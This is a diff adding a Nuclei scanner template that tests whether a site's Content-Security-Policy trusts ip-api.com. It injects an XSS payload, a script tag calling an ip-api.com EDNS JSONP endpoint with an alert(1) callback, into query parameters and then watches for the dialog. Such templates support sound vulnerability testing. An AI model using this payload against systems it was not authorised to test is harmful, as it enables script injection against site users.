@@ -1,0 +1,55 @@
+id: ip-api-edns-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - IP-API EDNS
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,ip-api-edns,vuln
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "ip-api.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: ip_api_edns_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://raae2vza0snymz9cm3r8ix74bs71vdlz.edns.ip-api.com/json?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "ip_api_edns_csp_xss == true"
+# digest: 4a0a00473045022004e90c3b1aeacbdb0ee1bdfba754dd7a8cceb1af510a1f8fcdc57eae9288dd32022100ce2d1e4b32ae142c8615fc92a62816d52636dbd1010e129291d8a8295be79a7e:922c64590222798bb761d5b6d8e72950
